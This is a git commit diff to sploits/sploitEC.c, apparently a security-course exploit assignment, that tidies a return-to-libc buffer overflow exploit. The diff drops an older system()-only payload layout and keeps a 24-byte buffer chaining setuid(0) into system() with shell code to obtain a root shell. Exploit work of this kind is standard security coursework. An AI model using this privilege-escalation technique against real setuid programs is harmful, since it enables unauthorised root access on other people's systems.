bd7625d600a42275610f85be1de857779e356505
Andrew <ajp294@cornell.edu>
2019-11-26 20:22:14 -0500

    Cleanup of EC file

--- sploits/sploitEC.c
+++ sploits/sploitEC.c
@@ -19,23 +19,11 @@ int main(void)
   printf("Env ptr: 0x%x, %p\n", env_ptr, env_ptr);
 
   // Below is for normal return to libc, but we want root return to libc
-  /*
-  char buffer[20]; // target4 takes size of 4, plus 3 bytes of fluff will get us to the ebp and eip
   // EBP: Random
-  // EIP: System
-  // EIP + 4: Dummy return (Can be exit())
-  // EIP + 8: Shell address
-  memset(buffer, 0x90, 8); // overwrite EBP also with NOP
-  memcpy(buffer+8, system_addr, 4); // system address goes in EIP
-  memset(buffer+12, 'A', 4); // dummy return address (Can this be exit()?)
-  // memcpy(buffer+12, exit_addr, 4); // Can this be exit()?
-  memcpy(buffer+16, shell_addr, 4); // shell address
-  */
-  // EBP: Random
-  // EIP: setuid
-  // EIP + 4: Dummy return from setuid (Should this be sysetm?)
-  // EIP + 8: setuid value (0)
-  // EPI + 12: Shell code?
+  // EIP: setuid()
+  // EIP + 4: system()
+  // EIP + 8: setuid args (0)
+  // EPI + 12: system args (shell code)
   char buffer[24];
   memset(buffer, 0x90, 8); // Overwrite EBP with NOP
   memcpy(buffer+8, setuid_addr, 4);
